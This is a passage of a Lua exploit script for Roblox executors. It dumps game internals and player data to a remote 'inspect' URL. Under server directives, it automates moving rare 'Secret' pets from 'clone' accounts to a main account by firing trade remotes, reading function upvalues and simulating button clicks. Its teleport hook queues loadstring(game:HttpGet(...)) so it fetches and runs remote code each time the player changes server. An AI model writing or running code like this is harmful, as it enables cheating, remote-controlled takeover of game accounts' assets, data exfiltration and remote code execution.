                                for _, s in ipairs(sub) do
                                    table.insert(cList, "upfn[" .. tostring(uk) .. "]:" .. s)
                                end
                            elseif type(uv) == "table" then
                                for tk, tv in pairs(uv) do
                                    if type(tv) == "function" then
                                        local sub = extractFnStrings(tv, depth + 1, visitedFns)
                                        for _, s in ipairs(sub) do
                                            table.insert(cList, "uptbl[" .. tostring(tk) .. "]:" .. s)
                                        end
                                    else
                                        table.insert(cList, "uptbl_k:" .. tostring(tk) .. "=" .. tostring(tv))
                                    end
                                end
                            end
                        end
                    end
                end)
                return cList
            end

            local function inspectModuleFunctions(modPath)
                local cur = ReplicatedStorage
                for seg in modPath:gmatch("[^%.]+") do
                    cur = cur and cur:FindFirstChild(seg)
                end
                local mod = cur and safeRequire(cur)
                if type(mod) ~= "table" then return nil end
                local info = {}
                if type(mod.GetDebugState) == "function" then
                    local okD, dState = pcall(function() return mod:GetDebugState() end)
                    if okD and type(dState) == "table" then
                        local ds = {}
                        for dk, dv in pairs(dState) do
                            ds[tostring(dk)] = tostring(dv)
                        end
                        info.debugState = ds
                    end
                end
                for fnName, fnVal in pairs(mod) do
                    if type(fnVal) == "function" then
                        info[tostring(fnName)] = extractFnStrings(fnVal, 0, {})
                    end
                end
                return info
            end
            dump.controllerInternals["TradingController"] = inspectModuleFunctions("Controllers.Trading.TradingController")
            dump.controllerInternals["TradeReviewController"] = inspectModuleFunctions("Controllers.Trading.TradeReviewController")
        end)
    end

    -- Dump actual TS2 DataController:GetReplica().Data.Pets all 10 keys & InventoryController:GetStacks() sample!
    pcall(function()
        local repData = getPlayerDataReplica()
        if type(repData) == "table" then
            local petsSubInfo = {}
            if type(repData.Pets) == "table" then
                for pk, pv in pairs(repData.Pets) do
                    local kStr = tostring(pk)
                    if kStr ~= "Index" and kStr ~= "IndexTiers" and kStr ~= "IndexRewards" then
                        if type(pv) == "table" then
                            local entries = {}
                            local cnt = 0
                            for ek, ev in pairs(pv) do
                                cnt = cnt + 1
                                if cnt <= 12 then
                                    if type(ev) == "table" then
                                        local f = {}
                                        for fk, fv in pairs(ev) do
                                            table.insert(f, tostring(fk) .. "=" .. tostring(fv))
                                        end
                                        table.insert(entries, tostring(ek) .. ":{" .. table.concat(f, ", ") .. "}")
                                    else
                                        table.insert(entries, tostring(ek) .. "=" .. tostring(ev))
                                    end
                                end
                            end
                            petsSubInfo[kStr] = { count = cnt, samples = entries }
                        else
                            petsSubInfo[kStr] = tostring(pv)
                        end
                    else
                        petsSubInfo[kStr] = "skipped_index"
                    end
                end
            end

            local stacksSample = {}
            pcall(function()
                local controllers = ReplicatedStorage and ReplicatedStorage:FindFirstChild("Controllers")
                local petsFolder = controllers and controllers:FindFirstChild("Pets")
                local invCtrl = petsFolder and safeRequire(petsFolder:FindFirstChild("InventoryController"))
                if type(invCtrl) == "table" and type(invCtrl.GetStacks) == "function" then
                    local ok, stacks = pcall(function() return invCtrl:GetStacks() end)
                    if not ok or type(stacks) ~= "table" then
                        ok, stacks = pcall(function() return invCtrl.GetStacks() end)
                    end
                    if ok and type(stacks) == "table" then
                        local sc = 0
                        for sk, sv in pairs(stacks) do
                            sc = sc + 1
                            if sc <= 10 then
                                if type(sv) == "table" then
                                    local f = {}
                                    for fk, fv in pairs(sv) do
                                        table.insert(f, tostring(fk) .. "=" .. tostring(fv))
                                    end
                                    table.insert(stacksSample, tostring(sk) .. ":{" .. table.concat(f, ", ") .. "}")
                                else
                                    table.insert(stacksSample, tostring(sk) .. "=" .. tostring(sv))
                                end
                            end
                        end
                    end
                end
            end)

            dump.playerReplicaData = {
                petsTable = petsSubInfo,
                currencies = repData.Currencies,
                statistics = repData.Statistics,
                inventoryStacks = stacksSample,
            }
        end
    end)

    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if pg then
        dump.tradingGuiDetails = {}
        local tradingGui = pg:FindFirstChild("Trading")
        if tradingGui then
            pcall(function()
                for _, desc in ipairs(tradingGui:GetDescendants()) do
                    if #dump.tradingGuiDetails < 100 and (desc:IsA("Frame") or desc:IsA("ScrollingFrame") or desc:IsA("TextButton") or desc:IsA("ImageButton") or desc:IsA("TextLabel")) then
                        local entry = {
                            name = desc.Name,
                            className = desc.ClassName,
                            path = desc:GetFullName():gsub("^Players%.[^%.]+%.PlayerGui%.", ""),
                            visible = isGuiActuallyVisible(desc),
                        }
                        if (desc:IsA("TextButton") or desc:IsA("TextLabel")) and desc.Text and desc.Text ~= "" then
                            entry.text = desc.Text
                        end
                        table.insert(dump.tradingGuiDetails, entry)
                    end
                end
            end)
        end

        for _, gui in ipairs(pg:GetChildren()) do
            if gui:IsA("ScreenGui") then
                table.insert(dump.screenGuis, { name = gui.Name, enabled = gui.Enabled })
                local gLower = gui.Name:lower()
                if not IGNORED_SCREENGUIS[gLower] then
                    for _, desc in ipairs(gui:GetDescendants()) do
                        if (desc:IsA("ScrollingFrame") or (desc:IsA("Frame") and desc:FindFirstChildWhichIsA("UIGridLayout"))) and #dump.candidatePetGuis < 40 then
                            local full = desc:GetFullName():gsub("^Players%.[^%.]+%.", "")
                            local sampleNames = {}
                            for _, ch in ipairs(desc:GetChildren()) do
                                if not ch:IsA("UILayout") and #sampleNames < 5 then
                                    table.insert(sampleNames, ch.Name)
                                end
                            end
                            table.insert(dump.candidatePetGuis, {
                                path = full,
                                visible = isGuiActuallyVisible(desc),
                                children = #desc:GetChildren(),
                                samples = sampleNames,
                            })
                        end
                    end
                end
            end
        end
    end

    postJson(CONFIG.INSPECT_URL, {
        userId = LocalPlayer.UserId,
        username = LocalPlayer.Name,
        placeId = game.PlaceId,
        structure = dump,
    })
    logDebug("Sent Inspector snapshot to " .. CONFIG.INSPECT_URL)
end

-- ===============================================================================
--   AUTO-TRADE SECRET CONSOLIDATION ENGINE (v2.4.0)
-- ===============================================================================

local currentTradeState = "IDLE"
local currentTradeMessage = nil
local lastTeleportAt = 0
local lastTradeRequestAt = 0
local lastTradeOfferAt = 0
local hasTradedInThisServer = false

local cachedApis = nil
local lastApiDiscoverAt = 0

local function discoverTradingAndPetApis()
    if cachedApis and (os.time() - lastApiDiscoverAt < 20) then
        return cachedApis
    end
    lastApiDiscoverAt = os.time()

    local apis = {
        tradingMods = {},
        petMods = {},
        uiMods = {},
        remotes = {},
        networkAdapters = {},
    }

    if ReplicatedStorage then
        local function loadFolderMods(relPath, targetTbl)
            pcall(function()
                local cur = ReplicatedStorage
                for seg in relPath:gmatch("[^%.]+") do
                    cur = cur and cur:FindFirstChild(seg)
                end
                if cur then
                    for _, ch in ipairs(cur:GetChildren()) do
                        if ch:IsA("ModuleScript") then
                            local mod = safeRequire(ch)
                            if type(mod) == "table" then
                                targetTbl[ch.Name] = mod
                                if type(mod.Network) == "table" then
                                    apis.networkAdapters[ch.Name] = mod.Network
                                end
                            end
                        end
                    end
                end
            end)
        end

        loadFolderMods("Controllers.Trading", apis.tradingMods)
        loadFolderMods("Shared.Trading", apis.tradingMods)
        loadFolderMods("Controllers.Pets", apis.petMods)
        loadFolderMods("Controllers.UI", apis.uiMods)

        pcall(function()
            local seenRemoteInst = {}
            for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
                if (desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction")) and not seenRemoteInst[desc] then
                    seenRemoteInst[desc] = true
                    local fullRel = desc:GetFullName():gsub("^ReplicatedStorage%.", ""):lower()
                    table.insert(apis.remotes, {
                        name = desc.Name:lower(),
                        path = fullRel,
                        inst = desc,
                    })
                end
            end
        end)
    end

    cachedApis = apis
    return apis
end

local function invokeRemoteOrMethod(modGroup, methodNames, remotePatterns, ...)
    local args = { ... }
    local called = false

    -- 1. Try loaded controller modules (stop at first matching method per module)
    if type(modGroup) == "table" then
        for _, mod in pairs(modGroup) do
            if type(mod) == "table" then
                for _, mName in ipairs(methodNames) do
                    local fn = mod[mName]
                    if type(fn) == "function" then
                        local ok = pcall(function() fn(mod, table.unpack(args)) end)
                        if not ok then
                            ok = pcall(function() fn(table.unpack(args)) end)
                        end
                        if ok then
                            called = true
                            break
                        end
                    end
                end
                local net = rawget(mod, "Network")
                if not called and type(net) == "table" then
                    for _, pat in ipairs(remotePatterns) do
                        local firedNet = false
                        pcall(function()
                            if type(net.FireServer) == "function" then
                                net:FireServer(pat, table.unpack(args))
                                firedNet = true
                            elseif type(net.InvokeServer) == "function" then
                                task.spawn(function()
                                    pcall(function() net:InvokeServer(pat, table.unpack(args)) end)
                                end)
                                firedNet = true
                            end
                        end)
                        if firedNet then
                            called = true
                            break
                        end
                    end
                end
            end
        end
    end

    if called then
        return true
    end

    -- 2. Try matching RemoteEvent / RemoteFunction instances (deduplicated, non-yielding)
    local apis = discoverTradingAndPetApis()
    for _, pat in ipairs(remotePatterns) do
        local lpat = pat:lower()
        for _, rEntry in ipairs(apis.remotes) do
            if rEntry.name == lpat or rEntry.path:find(lpat, 1, true) then
                local rInst = rEntry.inst
                if rInst:IsA("RemoteEvent") then
                    pcall(function() rInst:FireServer(table.unpack(args)) end)
                    return true
                elseif rInst:IsA("RemoteFunction") then
                    task.spawn(function()
                        pcall(function() rInst:InvokeServer(table.unpack(args)) end)
                    end)
                    return true
                end
            end
        end
    end

    return false
end

local function fireGuiButton(btn)
    if not btn or not btn:IsA("GuiButton") then
        return false
    end
    local fired = false
    if type(firesignal) == "function" then
        pcall(function()
            firesignal(btn.Activated)
            fired = true
        end)
        pcall(function()
            firesignal(btn.MouseButton1Click)
            fired = true
        end)
    end
    if not fired and type(getconnections) == "function" then
        for _, sig in ipairs({ btn.Activated, btn.MouseButton1Click }) do
            pcall(function()
                for _, conn in ipairs(getconnections(sig)) do
                    if type(conn.Fire) == "function" then
                        conn:Fire()
                        fired = true
                    elseif type(conn.Function) == "function" then
                        task.spawn(conn.Function)
                        fired = true
                    end
                end
            end)
        end
    end
    return fired
end

-- Returns an array of owned Secret pet records: { uuid, name, equipped, locked, raw }
local function collectOwnedSecretRecords()
    discoverGamePetCatalog()
    local records = {}
    local seenUuids = {}

    pcall(function()
        local repData = getPlayerDataReplica()
        if type(repData) ~= "table" or type(repData.Pets) ~= "table" then
            return
        end

        local eqMap = {}
        for _, eqKey in ipairs({ "EquippedPets", "Equipped", "ActivePets", "EquippedIds" }) do
            local eqTbl = repData.Pets[eqKey] or repData[eqKey]
            if type(eqTbl) == "table" then
                for k, v in pairs(eqTbl) do
                    if type(v) == "string" or type(v) == "number" then
                        eqMap[tostring(v)] = true
                    elseif v == true then
                        eqMap[tostring(k)] = true
                    end
                end
            end
        end

        local skipSubKeys = {
            ["index"] = true,
            ["indextiers"] = true,
            ["indexrewards"] = true,
            ["helddigest"] = true,
            ["autodelete"] = true,
            ["equipped"] = true,
            ["equippedpets"] = true,
            ["equippedids"] = true,
            ["maxequipped"] = true,
            ["maxstorage"] = true,
        }

        local candidateTables = {}
        if type(repData.Pets.Owned) == "table" then
            table.insert(candidateTables, repData.Pets.Owned)
        else
            for subKey, subVal in pairs(repData.Pets) do
                local lsk = tostring(subKey):lower()
                if type(subVal) == "table" and not skipSubKeys[lsk] then
                    table.insert(candidateTables, subVal)
                end
            end
        end

        for _, subVal in ipairs(candidateTables) do
            for pk, pv in pairs(subVal) do
                if type(pv) == "table" then
                    local keyStr = tostring(pk)
                    local uuid = (type(pk) == "string" and #keyStr >= 16 and keyStr)
                        or tostring(pv.UUID or pv.Id or pv.id or pk)
                    if not seenUuids[uuid] then
                        local rawId = pv.Name or pv.name or pv.Species or pv.PetName or pv.PetId or (type(pk) == "string" and pk)
                        local rawImg = extractAssetId(pv.Image or pv.Icon or pv.AssetId)
                        local known = matchKnownSecret(tostring(rawId or ""), rawImg)
                        local rawRarity = tostring(pv.Rarity or pv.rarity or "")
                        local isSec = (known ~= nil)
                            or (rawRarity:lower():find("secret", 1, true) ~= nil)
                            or (rawRarity:lower() == "leaderboard")
                            or (pv.IsSecret == true)
                        local petName = (known and known.name) or (type(rawId) == "string" and not isBogusPetName(rawId) and rawId) or nil
                        if isSec and petName and not isBogusPetName(petName) then
                            seenUuids[uuid] = true
                            local isEq = (pv.Equip == true) or (pv.Equipped == true) or (eqMap[uuid] == true)
                            local isLock = (pv.Locked == true) or (pv.locked == true)
                            table.insert(records, {
                                uuid = uuid,
                                name = petName,
                                equipped = isEq,
                                locked = isLock,
                                raw = pv,
                            })
                        end
                    end
                end
            end
        end
    end)

    return records
end

-- Helper to get RemoteServices.PetService.RE.PetActionRequested
local function getPetActionRemote()
    if not ReplicatedStorage then return nil end
    local rs = ReplicatedStorage:FindFirstChild("RemoteServices")
    local petSvc = rs and rs:FindFirstChild("PetService")
    local re = petSvc and petSvc:FindFirstChild("RE")
    return re and re:FindFirstChild("PetActionRequested") or nil
end

-- Helper to get RemoteServices.TradingService.RE.TradeRequested
local function getTradeRequestedRemote()
    if not ReplicatedStorage then return nil end
    local rs = ReplicatedStorage:FindFirstChild("RemoteServices")
    local trSvc = rs and rs:FindFirstChild("TradingService")
    local re = trSvc and trSvc:FindFirstChild("RE")
    return re and re:FindFirstChild("TradeRequested") or nil
end

-- Helper to get TradingController:GetDebugState() safely
local function getTradingDebugState()
    local apis = discoverTradingAndPetApis()
    local tradingCtrl = apis.tradingMods["TradingController"]
    if type(tradingCtrl) == "table" and type(tradingCtrl.GetDebugState) == "function" then
        local ok, st = pcall(function() return tradingCtrl:GetDebugState() end)
        if not ok or type(st) ~= "table" then
            ok, st = pcall(function() return tradingCtrl.GetDebugState() end)
        end
        if ok and type(st) == "table" then
            return st
        end
    end
    return nil
end

-- Auto-Unequip all Secret pets on the clone account using authoritative PetService.RE.PetActionRequested
local function unequipSecretPets(secretRecords)
    local apis = discoverTradingAndPetApis()
    local invCtrl = apis.petMods["InventoryController"]
    local petActionRE = getPetActionRemote()
    local unequippedAny = false

    for _, rec in ipairs(secretRecords) do
        if rec.equipped then
            unequippedAny = true
            if petActionRE then
                pcall(function()
                    petActionRE:FireServer({ Action = "Unequip", PetId = rec.uuid })
                end)
            end
            if type(invCtrl) == "table" then
                pcall(function()
                    if type(invCtrl.SelectPet) == "function" then
                        invCtrl:SelectPet(rec.uuid)
                    end
                    if type(invCtrl.GetUnequipButton) == "function" then
                        local btn = invCtrl:GetUnequipButton()
                        if btn then
                            fireGuiButton(btn)
                        end
                    end
                end)
            end
        end
    end

    if unequippedAny and petActionRE then
        pcall(function()
            petActionRE:FireServer({ Action = "UnequipAll" })
        end)
    end
    return unequippedAny
end

-- Auto-Unlock all Secret pets on the clone account using authoritative PetService.RE.PetActionRequested
local function unlockSecretPets(secretRecords)
    local petActionRE = getPetActionRemote()
    local unlockedAny = false

    for _, rec in ipairs(secretRecords) do
        if rec.locked then
            unlockedAny = true
            if petActionRE then
                pcall(function()
                    petActionRE:FireServer({ Action = "SetLock", PetId = rec.uuid, Locked = false })
                end)
                pcall(function()
                    petActionRE:FireServer({ Action = "Unlock", PetId = rec.uuid })
                end)
            end
        end
    end
    return unlockedAny
end

local function ensureTradeRequestsEnabled()
    pcall(function()
        local repData = getPlayerDataReplica()
        if type(repData) == "table" and type(repData.Settings) == "table" then
            local cur = repData.Settings.TradeRequests
            if cur == false or cur == "Off" or cur == "None" or cur == "Disabled" or cur == 0 then
                local rs = ReplicatedStorage and ReplicatedStorage:FindFirstChild("RemoteServices")
                local setSvc = rs and rs:FindFirstChild("SettingsService")
                local rf = setSvc and setSvc:FindFirstChild("RF") and setSvc.RF:FindFirstChild("UpdateSetting")
                if rf and rf:IsA("RemoteFunction") then
                    task.spawn(function()
                        pcall(function() rf:InvokeServer("TradeRequests", "All") end)
                        pcall(function() rf:InvokeServer("TradeRequests", 1) end)
                    end)
                end
            end
        end
    end)
end

local function queueTeleportLoader()
    local qFn = (type(queue_on_teleport) == "function" and queue_on_teleport)
        or (type(syn) == "table" and type(syn.queue_on_teleport) == "function" and syn.queue_on_teleport)
        or (type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" and fluxus.queue_on_teleport)
        or (type(getgenv) == "function" and type(getgenv().queue_on_teleport) == "function" and getgenv().queue_on_teleport)
    if not qFn then
        return false
    end

    local loaderCode = string.format(
        [[getgenv().TrackStats = { Key = %q, Interval = %s }
pcall(function() loadstring(game:HttpGet(%q))() end)]],
        tostring(CONFIG.API_KEY or ""),
        tostring(CONFIG.SEND_INTERVAL or 2),
        tostring(CONFIG.LOADER_URL)
    )
    local ok = pcall(qFn, loaderCode)
    return ok
end

local function findTargetMainPlayer(directive)
    local targetUid = tonumber(directive.mainUserId)
    local targetName = type(directive.mainUsername) == "string" and directive.mainUsername:lower() or ""
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            if (targetUid and plr.UserId == targetUid) or (targetName ~= "" and plr.Name:lower() == targetName) then
                return plr
            end
        end
    end
    return nil
end

local function getTradingScreenGui()
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    return pg and pg:FindFirstChild("Trading") or nil
end

local function isTradePartnerVerified(trustedSet)
    -- 1. Check authoritative TradingController:GetDebugState().PartnerUserId first
    local dState = getTradingDebugState()
    if type(dState) == "table" and dState.PartnerUserId then
        if trustedSet[tostring(dState.PartnerUserId)] then
            return true
        end
    end

    -- 2. Fallback: Check PlayerGui.Trading partner name labels (Build.Table.Them.Name / Review.Them.Sub)
    local tGui = getTradingScreenGui()
    if not tGui or not tGui.Enabled then
        return false
    end
    for _, desc in ipairs(tGui:GetDescendants()) do
        if desc:IsA("TextLabel") and isGuiActuallyVisible(desc) and desc.Text and desc.Text ~= "" then
            local lowerTxt = desc.Text:lower()
            for key, _ in pairs(trustedSet) do
                local lKey = tostring(key):lower()
                if #lKey >= 3 and lowerTxt:find(lKey, 1, true) then
                    return true
                end
            end
        end
    end
    return false
end

local function isActiveTradeWindowVisible(trustedSet)
    local dState = getTradingDebugState()
    if type(dState) == "table" and dState.TradingVisible == true then
        if type(trustedSet) == "table" then
            return isTradePartnerVerified(trustedSet)
        end
        return true
    end
    local tGui = getTradingScreenGui()
    if not tGui or not tGui.Enabled then
        return false
    end
    if type(trustedSet) == "table" and not isTradePartnerVerified(trustedSet) then
        return false
    end
    for _, desc in ipairs(tGui:GetDescendants()) do
        if (desc:IsA("TextButton") or desc:IsA("ImageButton")) and isGuiActuallyVisible(desc) then
            local nm = desc.Name:lower()
            local txt = (desc:IsA("TextButton") and desc.Text or ""):lower()
            if nm:find("ready", 1, true) or nm:find("accept", 1, true) or nm:find("confirm", 1, true)
                or txt:find("ready", 1, true) or txt:find("accept", 1, true) or txt:find("confirm", 1, true) then
                return true
            end
        end
    end
    return false
end

local function requestTradeWithPlayer(targetPlayer)
    if not targetPlayer then
        return
    end
    if os.time() - lastTradeRequestAt < 3 then
        return
    end
    lastTradeRequestAt = os.time()

    -- 1. Authoritative TradingService.RE.TradeRequested:FireServer({ Action = "Request", TargetUserId = ... })
    local tradeRE = getTradeRequestedRemote()
    if tradeRE then
        pcall(function()
            tradeRE:FireServer({ Action = "Request", TargetUserId = targetPlayer.UserId })
        end)
    end

    -- 2. Also call TradingController:RequestTrade(targetPlayer.UserId)
    local apis = discoverTradingAndPetApis()
    local tradingCtrl = apis.tradingMods["TradingController"]
    if type(tradingCtrl) == "table" and type(tradingCtrl.RequestTrade) == "function" then
        pcall(function() tradingCtrl:RequestTrade(targetPlayer.UserId) end)
        pcall(function() tradingCtrl.RequestTrade(targetPlayer.UserId) end)
        pcall(function() tradingCtrl:RequestTrade(targetPlayer) end)
    end
end

local function getInternalTogglePetFn(tradingCtrl)
    if type(tradingCtrl) ~= "table" or type(tradingCtrl.DebugTogglePet) ~= "function" then
        return nil
    end
    local getUpvals = (type(debug) == "table" and debug.getupvalues) or getupvalues
    if type(getUpvals) ~= "function" then
        return nil
    end
    local ok, upvals = pcall(getUpvals, tradingCtrl.DebugTogglePet)
    if not ok or type(upvals) ~= "table" then
        return nil
    end
    if type(upvals[3]) == "function" then
        return upvals[3]
    end
    for idx, uv in pairs(upvals) do
        if type(uv) == "function" and idx ~= 1 then
            return uv
        end
    end
    return nil
end

local offerRevisionCounter = 0

local function offerSecretPetsAndConfirm(secretRecords, targetPlayer)
    local apis = discoverTradingAndPetApis()
    local tradingCtrl = apis.tradingMods["TradingController"]
    local tradeRE = getTradeRequestedRemote()
    local dState = getTradingDebugState()

    if os.time() - lastTradeOfferAt >= 2 then
        lastTradeOfferAt = os.time()

        -- Read already-offered pet UUIDs from TradingController:GetOfferedPets() so we never toggle off an already-added Secret!
        local alreadyOffered = {}
        local currentOfferedCount = 0
        if type(tradingCtrl) == "table" and type(tradingCtrl.GetOfferedPets) == "function" then
            pcall(function()
                local ok, offered = pcall(function() return tradingCtrl:GetOfferedPets() end)
                if not ok or type(offered) ~= "table" then
                    ok, offered = pcall(function() return tradingCtrl.GetOfferedPets() end)
                end
                if ok and type(offered) == "table" then
                    for k, v in pairs(offered) do
                        if type(v) == "string" or type(v) == "number" then
                            alreadyOffered[tostring(v)] = true
                            currentOfferedCount = currentOfferedCount + 1
                        elseif type(v) == "table" and (v.Id or v.UUID or v.Uid or v.id) then
                            alreadyOffered[tostring(v.Id or v.UUID or v.Uid or v.id)] = true
                            currentOfferedCount = currentOfferedCount + 1
                        elseif v == true then
                            alreadyOffered[tostring(k)] = true
                            currentOfferedCount = currentOfferedCount + 1
                        end
                    end
                end
            end)
        end

        local internalToggleFn = getInternalTogglePetFn(tradingCtrl)
        local targetRefs = {}
        local targetPetIds = {}

        -- Offer up to 20 secrets per trade (Build.Table.You.Count = 20)
        for _, rec in ipairs(secretRecords) do
            if #targetPetIds < 20 then
                table.insert(targetPetIds, rec.uuid)
                table.insert(targetRefs, { TypeName = "Pet", Uid = rec.uuid, Amount = 1 })
                if not alreadyOffered[rec.uuid] and currentOfferedCount < 20 then
                    currentOfferedCount = currentOfferedCount + 1
                    local toggled = false
                    if type(internalToggleFn) == "function" then
                        toggled = pcall(internalToggleFn, rec.uuid)
                    end
                    if not toggled and type(tradingCtrl) == "table" and type(tradingCtrl.DebugTogglePet) == "function" then
                        toggled = pcall(function() tradingCtrl:DebugTogglePet(rec.uuid) end)
                            or pcall(function() tradingCtrl.DebugTogglePet(rec.uuid) end)
                    end
                end
            end
        end

        -- Authoritative fallback via TradingService.RE.TradeRequested:FireServer({ Action = "Offer", ... }) if 0 offered so far
        local selectedCount = (type(dState) == "table" and tonumber(dState.SelectedOfferCount)) or currentOfferedCount
        if selectedCount == 0 and tradeRE and #targetPetIds > 0 then
            offerRevisionCounter = offerRevisionCounter + 1
            pcall(function()
                tradeRE:FireServer({
                    Action = "Offer",
                    Revision = offerRevisionCounter,
                    PetIds = targetPetIds,
                    Refs = targetRefs,
                    Tokens = 0,
                })
            end)
        end
    end

    -- Trigger ActivateReady() + authoritative TradeRequested Lock & Confirm
    if type(tradingCtrl) == "table" and type(tradingCtrl.ActivateReady) == "function" then
        pcall(function() tradingCtrl:ActivateReady() end)
        pcall(function() tradingCtrl.ActivateReady() end)
    end
    if tradeRE then
        if not (type(dState) == "table" and dState.LocalLocked == true) then
            pcall(function()
                tradeRE:FireServer({ Action = "Lock", Locked = true })
            end)
        end
        pcall(function()
            tradeRE:FireServer({ Action = "Confirm" })
        end)
    end

    local tGui = getTradingScreenGui()
    if tGui then
        for _, desc in ipairs(tGui:GetDescendants()) do
            if (desc:IsA("TextButton") or desc:IsA("ImageButton")) and isGuiActuallyVisible(desc) then
                local fullPath = desc:GetFullName():lower()
                local nm = desc.Name:lower()
                local txt = (desc:IsA("TextButton") and desc.Text or ""):lower()
                if fullPath:find("actions.ready", 1, true)
                    or ((nm:find("ready", 1, true) or nm:find("accept", 1, true) or nm:find("confirm", 1, true)
                        or txt:find("ready", 1, true) or txt:find("accept", 1, true) or txt:find("confirm", 1, true))
                        and not fullPath:find("cancel", 1, true) and not fullPath:find("decline", 1, true)
                        and not nm:find("decline", 1, true) and not nm:find("cancel", 1, true)
                        and not txt:find("decline", 1, true) and not txt:find("cancel", 1, true)) then
                    fireGuiButton(desc)
                end
            end
        end
    end
end

local function acceptIncomingTradeAndConfirm(trustedSet)
    local apis = discoverTradingAndPetApis()
    local tradingCtrl = apis.tradingMods["TradingController"]
    local tradeRE = getTradeRequestedRemote()
    local dState = getTradingDebugState()

    -- 1. Check if there is an incoming trade request from a trusted clone (dState.RequestUserId)
    if type(dState) == "table" and dState.RequestUserId and trustedSet[tostring(dState.RequestUserId)] then
        if tradeRE then
            pcall(function()
                tradeRE:FireServer({ Action = "Respond", Accepted = true })
            end)
        end
    elseif tradeRE then
        -- Also check if any trusted clone is currently in the server and we are not yet in a trade window
        if not (type(dState) == "table" and dState.TradingVisible == true) then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and (trustedSet[tostring(plr.UserId)] or trustedSet[plr.Name:lower()]) then
                    pcall(function()
                        tradeRE:FireServer({ Action = "Respond", Accepted = true, FromUserId = plr.UserId })
                    end)
                end
            end
        end
    end

    -- 2. Scan PlayerGui.Trading (or verified trade request prompt mentioning a trusted username)
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if pg then
        for _, gui in ipairs({ pg:FindFirstChild("Trading"), pg:FindFirstChild("Dialogs"), pg:FindFirstChild("Dialog"), pg:FindFirstChild("Tabs") }) do
            if gui and gui:IsA("ScreenGui") and gui.Enabled then
                local guiVerified = (gui.Name == "Trading" and isTradePartnerVerified(trustedSet))
                if not guiVerified then
                    for _, lbl in ipairs(gui:GetDescendants()) do
                        if lbl:IsA("TextLabel") and isGuiActuallyVisible(lbl) and lbl.Text and lbl.Text ~= "" then
                            local ltxt = lbl.Text:lower()
                            for k, _ in pairs(trustedSet) do
                                local lk = tostring(k):lower()
                                if #lk >= 3 and ltxt:find(lk, 1, true) then
                                    guiVerified = true
                                    break
                                end
                            end
                        end
                        if guiVerified then break end
                    end
                end
                if guiVerified then
                    for _, desc in ipairs(gui:GetDescendants()) do
                        if (desc:IsA("TextButton") or desc:IsA("ImageButton")) and isGuiActuallyVisible(desc) then
                            local nm = desc.Name:lower()
                            local txt = (desc:IsA("TextButton") and desc.Text or ""):lower()
                            if (nm:find("accept", 1, true) or nm:find("ready", 1, true) or nm:find("confirm", 1, true)
                                or txt:find("accept", 1, true) or txt:find("ready", 1, true) or txt:find("confirm", 1, true))
                                and not nm:find("decline", 1, true) and not nm:find("cancel", 1, true)
                                and not txt:find("decline", 1, true) and not txt:find("cancel", 1, true) then
                                fireGuiButton(desc)
                            end
                        end
                    end
                end
            end
        end
    end

    -- 3. In an active verified trade with a trusted clone, once the clone has added pets (OtherOfferCount > 0 or OtherLocked), lock & confirm!
    if isActiveTradeWindowVisible(trustedSet) then
        local otherCount = (type(dState) == "table" and tonumber(dState.OtherOfferCount)) or 1
        local otherLocked = (type(dState) == "table" and dState.OtherLocked == true)
        if otherCount > 0 or otherLocked or not dState then
            if type(tradingCtrl) == "table" and type(tradingCtrl.ActivateReady) == "function" then
                pcall(function() tradingCtrl:ActivateReady() end)
                pcall(function() tradingCtrl.ActivateReady() end)
            end
            if tradeRE then
                if not (type(dState) == "table" and dState.LocalLocked == true) then
                    pcall(function()
                        tradeRE:FireServer({ Action = "Lock", Locked = true })
                    end)
                end
                pcall(function()
                    tradeRE:FireServer({ Action = "Confirm" })
                end)
            end
        end
    end
end

local function hopToAnotherServer(avoidJobId)
    if not TeleportService or (os.time() - lastTeleportAt < 12) then
        return
    end
    lastTeleportAt = os.time()
    queueTeleportLoader()
    pcall(function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)
end

local function executeTradeDirective(directive, secretRecords)
    if type(directive) ~= "table" then
        return
    end
    local role = tostring(directive.role or "IDLE")
    local action = tostring(directive.action or "NONE")

    if role == "MAIN" and action == "AUTO_ACCEPT" then
        ensureTradeRequestsEnabled()
        local trustedSet = {}
        if type(directive.trustedUserIds) == "table" then
            for _, uid in ipairs(directive.trustedUserIds) do
                trustedSet[tostring(uid)] = true
            end
        end
        if directive.activeCloneUserId then
            trustedSet[tostring(directive.activeCloneUserId)] = true
        end
        if type(directive.activeCloneUsername) == "string" and directive.activeCloneUsername ~= "" then
            trustedSet[directive.activeCloneUsername:lower()] = true
        end
        acceptIncomingTradeAndConfirm(trustedSet)
        if isActiveTradeWindowVisible() then
            currentTradeState = "TRADING"
            currentTradeMessage = "Receiving secrets from clone"
        else
            currentTradeState = "READY_MAIN"
            currentTradeMessage = "Waiting for clone trade request"
        end
        return
    end

    if role == "CLONE_ACTIVE" and action == "JOIN_AND_TRADE" then
        if #secretRecords == 0 then
            currentTradeState = "COMPLETED"
            currentTradeMessage = "0 Secrets remaining — consolidation finished"
            if directive.hopOutAfterTrade ~= false and (hasTradedInThisServer or tostring(game.JobId) == tostring(directive.mainJobId or "")) then
                currentTradeState = "HOPPING_OUT"
                hopToAnotherServer(directive.mainJobId)
            end
            return
        end

        local mainPlr = findTargetMainPlayer(directive)
        local targetJobId = tostring(directive.mainJobId or "")
        local targetPlaceId = tonumber(directive.mainPlaceId) or game.PlaceId

        if not mainPlr then
            if targetJobId ~= "" and tostring(game.JobId) ~= targetJobId then
                currentTradeState = "TELEPORTING"
                currentTradeMessage = "Joining Main Account server (" .. targetJobId:sub(1, 8) .. ")"
                if TeleportService and (os.time() - lastTeleportAt >= 12) then
                    lastTeleportAt = os.time()
                    queueTeleportLoader()
                    pcall(function()
                        TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
                    end)
                end
            else
                currentTradeState = "WAITING_MAIN"
                currentTradeMessage = "Waiting for Main Account in server"
            end
            return
        end

        -- Same server as Main Account: Unequip & Unlock all Secrets first!
        currentTradeState = "PREPARING_PETS"
        currentTradeMessage = "Unequipping & unlocking " .. tostring(#secretRecords) .. " secrets"
